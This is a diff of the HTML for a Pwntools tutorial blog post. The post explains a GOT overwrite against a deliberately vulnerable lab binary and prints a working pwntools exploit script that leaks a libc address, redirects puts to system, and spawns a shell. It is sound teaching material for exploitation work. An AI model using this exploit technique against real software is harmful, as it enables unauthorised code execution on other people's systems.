@@ -1,11 +1,148 @@
-<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Simple GOT Overwrite - Pwntools Blog</title><meta name=description content="Exploiting a basic vulnerability involving a GOT overwrite"><meta name=author content="Team Gallopsled"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Pwntools Blog","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/blog.pwntools.com\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/blog.pwntools.com\/posts\/got-overwrite\/","name":"Simple got overwrite"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"\u003ca href=\u0027https:\/\/twitter.com\/ebeip90\u0027\u003eebeip90\u003c\/a\u003e"},"headline":"Simple GOT Overwrite","description":"Modern Linux relies on a linker to match imported symbols to an external library, generally libc.so. The process of overwriting entries in the Global Offset Table (GOT) can easily lead to controlled code execution.\n","inLanguage":"en","wordCount":1658,"datePublished":"2021-02-23T20:22:21","dateModified":"2021-02-23T20:22:21","image":"https:\/\/blog.pwntools.com\/img\/logo.png","keywords":["got, aslr, easy, elf, libc"],"mainEntityOfPage":"https:\/\/blog.pwntools.com\/posts\/got-overwrite\/","publisher":{"@type":"Organization","name":"https:\/\/blog.pwntools.com\/","logo":{"@type":"ImageObject","url":"https:\/\/blog.pwntools.com\/img\/logo.png","height":60,"width":60}}}</script><meta property="og:title" content="Simple GOT Overwrite"><meta property="og:description" content="Exploiting a basic vulnerability involving a GOT overwrite"><meta property="og:image" content="https://blog.pwntools.com/img/logo.png"><meta property="og:url" content="https://blog.pwntools.com/posts/got-overwrite/"><meta property="og:type" content="website"><meta property="og:site_name" content="Pwntools Blog"><meta name=twitter:title content="Simple GOT Overwrite"><meta name=twitter:description content="Exploiting a basic vulnerability involving a GOT overwrite"><meta name=twitter:image content="https://blog.pwntools.com/img/logo.png"><meta name=twitter:card content="summary"><meta name=twitter:site content="@Pwntools"><meta name=twitter:creator content="@Pwntools"><meta name=generator content="Hugo 0.82.1"><link rel=alternate href=https://blog.pwntools.com/index.xml type=application/rss+xml title="Pwntools Blog"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://blog.pwntools.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://blog.pwntools.com/css/syntax.css><link rel=stylesheet href=https://blog.pwntools.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Simple GOT Overwrite - Pwntools Blog</title>
+<meta name=description content="Exploiting a basic vulnerability involving a GOT overwrite">
+<meta name=author content="Team Gallopsled"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Pwntools Blog","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/blog.pwntools.com\/"}</script>
+<script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/blog.pwntools.com\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/blog.pwntools.com\/posts\/got-overwrite\/","name":"Simple got overwrite"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"\u003ca href=\u0027https:\/\/twitter.com\/ebeip90\u0027\u003eebeip90\u003c\/a\u003e"},"headline":"Simple GOT Overwrite","description":"Modern Linux relies on a linker to match imported symbols to an external library, generally libc.so. The process of overwriting entries in the Global Offset Table (GOT) can easily lead to controlled code execution.\n","inLanguage":"en","wordCount":1658,"datePublished":"2021-02-23T20:22:21","dateModified":"2021-02-23T20:22:21","image":"https:\/\/blog.pwntools.com\/img\/logo.png","keywords":["got, aslr, easy, elf, libc"],"mainEntityOfPage":"https:\/\/blog.pwntools.com\/posts\/got-overwrite\/","publisher":{"@type":"Organization","name":"https:\/\/blog.pwntools.com\/","logo":{"@type":"ImageObject","url":"https:\/\/blog.pwntools.com\/img\/logo.png","height":60,"width":60}}}</script>
+<meta property="og:title" content="Simple GOT Overwrite">
+<meta property="og:description" content="Exploiting a basic vulnerability involving a GOT overwrite">
+<meta property="og:image" content="https://blog.pwntools.com/img/logo.png">
+<meta property="og:url" content="https://blog.pwntools.com/posts/got-overwrite/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Pwntools Blog">
+<meta name=twitter:title content="Simple GOT Overwrite">
+<meta name=twitter:description content="Exploiting a basic vulnerability involving a GOT overwrite">
+<meta name=twitter:image content="https://blog.pwntools.com/img/logo.png">
+<meta name=twitter:card content="summary">
+<meta name=twitter:site content="@Pwntools">
+<meta name=twitter:creator content="@Pwntools">
+<meta name=generator content="Hugo 0.88.1">
+<link rel=alternate href=https://blog.pwntools.com/index.xml type=application/rss+xml title="Pwntools Blog"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous>
+<link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous>
+<link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://blog.pwntools.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+<link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://blog.pwntools.com/css/syntax.css><link rel=stylesheet href=https://blog.pwntools.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous>
+<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous>
+</head>
+<body>
+<nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+<div class=container-fluid>
+<div class=navbar-header>
+<button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
 <span class=sr-only>Toggle navigation</span>
-<span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button>
-<a class=navbar-brand href=https://blog.pwntools.com/>Pwntools Blog</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Discord href=https://discord.gg/96VA2zvjCB>Discord</a></li><li><a title=Docs href=https://docs.pwntools.com>Docs</a></li><li><a title=Tutorials href=https://github.com/Gallopsled/pwntools-tutorial/blob/master/README.md>Tutorials</a></li><li><a href=#modalSearch data-toggle=modal data-target=#modalSearch style=outline:none><span class="hidden-sm hidden-md hidden-lg">Search</span> <span id=searchGlyph class="glyphicon glyphicon-search"></span></a></li></ul></div><div class=avatar-container><div class=avatar-img-border><a title="Pwntools Blog" href=https://blog.pwntools.com/><img class=avatar-img src=https://blog.pwntools.com/img/logo.png alt="Pwntools Blog"></a></div></div></div></nav><div id=modalSearch class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><button type=button class=close data-dismiss=modal>&#215;</button><h4 class=modal-title>Search Pwntools Blog</h4></div><div class=modal-body><gcse:search></gcse:search></div><div class=modal-footer><button type=button class="btn btn-default" data-dismiss=modal>Close</button></div></div></div></div><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=https://blog.pwntools.com/>Pwntools Blog</a>
+</div>
+<div class="collapse navbar-collapse" id=main-navbar>
+<ul class="nav navbar-nav navbar-right">
+<li>
+<a title=Discord href=https://discord.gg/96VA2zvjCB>Discord</a>
+</li>
+<li>
+<a title=Docs href=https://docs.pwntools.com>Docs</a>
+</li>
+<li>
+<a title=Tutorials href=https://github.com/Gallopsled/pwntools-tutorial/blob/master/README.md>Tutorials</a>
+</li>
+<li>
+<a href=#modalSearch data-toggle=modal data-target=#modalSearch style=outline:none>
+<span class="hidden-sm hidden-md hidden-lg">Search</span> <span id=searchGlyph class="glyphicon glyphicon-search"></span>
+</a>
+</li>
+</ul>
+</div>
+<div class=avatar-container>
+<div class=avatar-img-border>
+<a title="Pwntools Blog" href=https://blog.pwntools.com/>
+<img class=avatar-img src=https://blog.pwntools.com/img/logo.png alt="Pwntools Blog">
+</a>
+</div>
+</div>
+</div>
+</nav>
+<div id=modalSearch class="modal fade" role=dialog>
+<div class=modal-dialog>
+<div class=modal-content>
+<div class=modal-header>
+<button type=button class=close data-dismiss=modal>&#215;</button>
+<h4 class=modal-title>Search Pwntools Blog</h4>
+</div>
+<div class=modal-body>
+<gcse:search></gcse:search>
+</div>
+<div class=modal-footer>
+<button type=button class="btn btn-default" data-dismiss=modal>Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
+<div class=pswp__bg></div>
+<div class=pswp__scroll-wrap>
+<div class=pswp__container>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class=pswp__top-bar>
+<div class=pswp__counter></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
 <button class="pswp__button pswp__button--share" title=Share></button>
 <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
-<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=posts-heading><h1>Simple GOT Overwrite</h1><hr class=small><h2 class=posts-subheading>Exploiting a basic vulnerability involving a GOT overwrite</h2></div></div></div></div></div></header><div class=container role=main><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><article role=main class=blog-post><p>Modern Linux relies on a linker to match imported symbols to an external library, generally <code>libc.so</code>. The process of overwriting entries in the Global Offset Table (GOT) can easily lead to controlled code execution.</p><h2 id=source-code-and-target-executable>Source Code and Target Executable</h2><p>We are given the source code to a vulnerable binary, and need to exploit it in order to gain code execution by spawning a shell. Because we are leveraging an information leak (ASLR bypass) for this vulnerability, we do not need to include it but it can easily be reproduced.</p><details><summary><strong>Expand full source for got.c</strong></summary><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class=pswp__preloader>
+<div class=pswp__preloader__icn>
+<div class=pswp__preloader__cut>
+<div class=pswp__preloader__donut></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class=pswp__share-tooltip></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class=pswp__caption>
+<div class=pswp__caption__center></div>
+</div>
+</div>
+</div>
+</div>
+<header class=header-section>
+<div class="intro-header no-img">
+<div class=container>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<div class=posts-heading>
+<h1>Simple GOT Overwrite</h1>
+<hr class=small>
+<h2 class=posts-subheading>Exploiting a basic vulnerability involving a GOT overwrite</h2>
+</div>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class=container role=main>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<article role=main class=blog-post>
+<p>Modern Linux relies on a linker to match imported symbols to an external library, generally <code>libc.so</code>. The process of overwriting entries in the Global Offset Table (GOT) can easily lead to controlled code execution.</p>
+<h2 id=source-code-and-target-executable>Source Code and Target Executable</h2>
+<p>We are given the source code to a vulnerable binary, and need to exploit it in order to gain code execution by spawning a shell. Because we are leveraging an information leak (ASLR bypass) for this vulnerability, we do not need to include it but it can easily be reproduced.</p>
+<details><summary><strong>Expand full source for got.c</strong></summary>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -42,7 +179,9 @@
 </span><span class=lnt>35
 </span><span class=lnt>36
 </span><span class=lnt>37
-</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>// got.c
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// got.c
 </span><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
 </span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
 </span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
@@ -79,15 +218,31 @@
 </span><span class=c1></span>    <span class=c1>// and student.name could be &#34;/bin/sh&#34;
 </span><span class=c1></span>    <span class=n>puts</span><span class=p>(</span><span class=n>student</span><span class=p>.</span><span class=n>name</span><span class=p>);</span>
 <span class=p>}</span>
-</code></pre></td></tr></table></div></div></details><p>To compile the binary, we need to use <code>clang</code>. In this case, it is preferred over GCC since recent Ubuntu versions of GCC do not respect <code>-fno-pie</code>. We also want a 32-bit binary, so we specify <code>-m32</code>. The flag <code>-Wl,-z,norelro</code> is sent to the linker, in order to disable the RELRO feature (a security mitigation to prevent GOT overwrite attacks).</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>$ clang -m32 -Wl,-z,norelro -o got got.c
-</code></pre></div><p>We can verify with <code>pwn checksec</code> that the binary is not position-independent (i.e. does not use ASLR) and does not have RELRO:</p><pre><code>$ pwn checksec got
+</code></pre></td></tr></table>
+</div>
+</div>
+</details>
+<p>To compile the binary, we need to use <code>clang</code>. In this case, it is preferred over GCC since recent Ubuntu versions of GCC do not respect <code>-fno-pie</code>. We also want a 32-bit binary, so we specify <code>-m32</code>. The flag <code>-Wl,-z,norelro</code> is sent to the linker, in order to disable the RELRO feature (a security mitigation to prevent GOT overwrite attacks).</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ clang -m32 -Wl,-z,norelro -o got got.c
+</code></pre></div><p>We can verify with <code>pwn checksec</code> that the binary is not position-independent (i.e. does not use ASLR) and does not have RELRO:</p>
+<pre tabindex=0><code>$ pwn checksec got
 [*] '/home/pwntools/got'
     Arch:     i386-32-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
-</code></pre><h2 id=exploitation-strategy>Exploitation Strategy</h2><p>The target binary gives us the opportunity to leak four bytes of data by allowing us to fill the entire <code>record</code> structure via read, and specifically the field <code>record.message</code>. It then prints the structure with <code>printf</code>, which allows us to leak data until a null terminator is encountered.</p><p>We can then write 4 bytes at the location <code>record.message</code> points, via the second <code>read</code> call.</p><p>Finally, we call <code>puts(student.name)</code>. Our goal is to hijack the GOT entry for <code>puts</code> and have it instead invoke <code>system</code> where <code>student.name</code> is <code>/bin/sh\x00</code>.</p><h2 id=exploit-script>Exploit Script</h2><p>Our exploit script starts by importing Pwntools, and setting <code>context.binary</code> which informs the rest of pwntools what architecture should be used by default. This is important for challenges which are for 64-bit binaries, or generate assembly, but we do it here just for convenience.</p><p>The whole exploit script can be seen by expanding the details below, but it is broken up for the sake of discussing it throughout the rest of this post.</p><details><summary><strong>Expand full source for exploit.py</strong></summary><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</code></pre><h2 id=exploitation-strategy>Exploitation Strategy</h2>
+<p>The target binary gives us the opportunity to leak four bytes of data by allowing us to fill the entire <code>record</code> structure via read, and specifically the field <code>record.message</code>. It then prints the structure with <code>printf</code>, which allows us to leak data until a null terminator is encountered.</p>
+<p>We can then write 4 bytes at the location <code>record.message</code> points, via the second <code>read</code> call.</p>
+<p>Finally, we call <code>puts(student.name)</code>. Our goal is to hijack the GOT entry for <code>puts</code> and have it instead invoke <code>system</code> where <code>student.name</code> is <code>/bin/sh\x00</code>.</p>
+<h2 id=exploit-script>Exploit Script</h2>
+<p>Our exploit script starts by importing Pwntools, and setting <code>context.binary</code> which informs the rest of pwntools what architecture should be used by default. This is important for challenges which are for 64-bit binaries, or generate assembly, but we do it here just for convenience.</p>
+<p>The whole exploit script can be seen by expanding the details below, but it is broken up for the sake of discussing it throughout the rest of this post.</p>
+<details><summary><strong>Expand full source for exploit.py</strong></summary>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -124,11 +279,13 @@
 </span><span class=lnt>35
 </span><span class=lnt>36
 </span><span class=lnt>37
-</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>e</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;got&#39;</span><span class=p>)</span>
 
-<span class=k>print</span><span class=p>(</span><span class=s2>&#34;puts@got is at &#34;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>))</span>
+<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;puts@got is at &#34;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>))</span>
 
 <span class=c1># Start the process</span>
 <span class=n>io</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
@@ -161,21 +318,30 @@
 <span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
 <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;cat flag.txt&#39;</span><span class=p>)</span>
 <span class=n>success</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>())</span>
-</code></pre></td></tr></table></div></div></details><p>Next the script starts the target process, and clears any existing output. Since the binary is not position-independent (does not use ASLR), the <em>location</em> of the <code>puts</code> pointer is known ahead of time, and can be automatically calculated by using <code>ELF.got.puts</code>.</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+</details>
+<p>Next the script starts the target process, and clears any existing output. Since the binary is not position-independent (does not use ASLR), the <em>location</em> of the <code>puts</code> pointer is known ahead of time, and can be automatically calculated by using <code>ELF.got.puts</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>e</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;got&#39;</span><span class=p>)</span>
 
-<span class=k>print</span><span class=p>(</span><span class=s2>&#34;puts@got is at &#34;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>))</span>
+<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;puts@got is at &#34;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>))</span>
 
 <span class=c1># Start the process</span>
 <span class=n>io</span> <span class=o>=</span> <span class=n>e</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
 <span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
-</code></pre></div><p>Next, we use the <code>fit()</code> functionality to create the <code>struct record student</code> on the heap. Note that <code>fit()</code> fills any intermediary bytes with the <code>cyclic()</code> pattern for free, making it easy to determine what offsets one might need in the future.</p><p><code>fit</code> is a very powerful tool and can create nested data structures. <code>tube.fit</code> does this and automatically sends the data over the tube. Since <code>io</code> here is a <code>process</code> tube, everything is automagic. Note that we have to manunally specify a NUL byte terminator for <code>/bin/sh</code>.</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=c1># We have 28 bytes, and 4 of them will be dumped</span>
+</code></pre></div><p>Next, we use the <code>fit()</code> functionality to create the <code>struct record student</code> on the heap. Note that <code>fit()</code> fills any intermediary bytes with the <code>cyclic()</code> pattern for free, making it easy to determine what offsets one might need in the future.</p>
+<p><code>fit</code> is a very powerful tool and can create nested data structures. <code>tube.fit</code> does this and automatically sends the data over the tube. Since <code>io</code> here is a <code>process</code> tube, everything is automagic. Note that we have to manunally specify a NUL byte terminator for <code>/bin/sh</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># We have 28 bytes, and 4 of them will be dumped</span>
 <span class=n>io</span><span class=o>.</span><span class=n>fit</span><span class=p>({</span>
 	<span class=mi>0</span><span class=p>:</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span>
 	<span class=mi>24</span><span class=p>:</span> <span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span>
 <span class=p>})</span>
-</code></pre></div><h3 id=memory-leak-details>Memory Leak Details</h3><p>Our goal is to leak the real address of <code>puts</code>, by leveraging its presence in the Global Offset Table. The diagram looks somewhat like what&rsquo;s below.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>  record                                        
+</code></pre></div><h3 id=memory-leak-details>Memory Leak Details</h3>
+<p>Our goal is to leak the real address of <code>puts</code>, by leveraging its presence in the Global Offset Table. The diagram looks somewhat like what&rsquo;s below.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>  record                                        
 ┌─────────┐                                     
 │         │            Global Offset Table      
 │         │         ┌───────────────────────┐   
@@ -204,16 +370,27 @@ libc.so.6────────┼──────────────�
 │              └───────┘                     │  
 └────────────────────────────────────────────┘  
 
-</code></pre></div><p>The next bit of data will leak a pointer to <code>puts</code> from the GOT, so we clear all data until a <code>"("</code> appears, from the line:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>26
-</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Message from %s: (%s)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>student</span><span class=p>.</span><span class=n>name</span><span class=p>,</span> <span class=n>student</span><span class=p>.</span><span class=n>message</span><span class=p>);</span>
-</code></pre></td></tr></table></div></div><p>After that character, the next four bytes will be the REAL address of <code>puts</code> in libc.</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=c1># Receive data until we get the open colon</span>
+</code></pre></div><p>The next bit of data will leak a pointer to <code>puts</code> from the GOT, so we clear all data until a <code>"("</code> appears, from the line:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>26
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Message from %s: (%s)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>student</span><span class=p>.</span><span class=n>name</span><span class=p>,</span> <span class=n>student</span><span class=p>.</span><span class=n>message</span><span class=p>);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>After that character, the next four bytes will be the REAL address of <code>puts</code> in libc.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># Receive data until we get the open colon</span>
 <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;(&#34;</span><span class=p>)</span>
 
 <span class=c1># Receive exactly four bytes of leaked data</span>
 <span class=n>got_puts</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>unpack</span><span class=p>()</span>
 <span class=n>info</span><span class=p>(</span><span class=s2>&#34;puts@GOT == </span><span class=si>%#x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>got_puts</span><span class=p>)</span>
 <span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
-</code></pre></div><h3 id=got-overwrite-details>GOT Overwrite Details</h3><p>Based on this address, we can load the same copy of libc as used by out target binary, find the OFFSET of <code>puts</code>, and use that to calculate the ACTUAL base address of <code>libc.so</code>.</p><p>With the real loaded address of libc set in <code>libc.address</code>, the address for <code>libc.symbols.system</code> is automatically updated, and we can use this to overwrite <code>puts</code> in the Global Offset Table. From here forward, all calls to <code>puts()</code> will instead call <code>system()</code></p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=c1># Calculate the base address of libc so we can calculate system()</span>
+</code></pre></div><h3 id=got-overwrite-details>GOT Overwrite Details</h3>
+<p>Based on this address, we can load the same copy of libc as used by out target binary, find the OFFSET of <code>puts</code>, and use that to calculate the ACTUAL base address of <code>libc.so</code>.</p>
+<p>With the real loaded address of libc set in <code>libc.address</code>, the address for <code>libc.symbols.system</code> is automatically updated, and we can use this to overwrite <code>puts</code> in the Global Offset Table. From here forward, all calls to <code>puts()</code> will instead call <code>system()</code></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># Calculate the base address of libc so we can calculate system()</span>
 <span class=n>libc</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>libc</span>
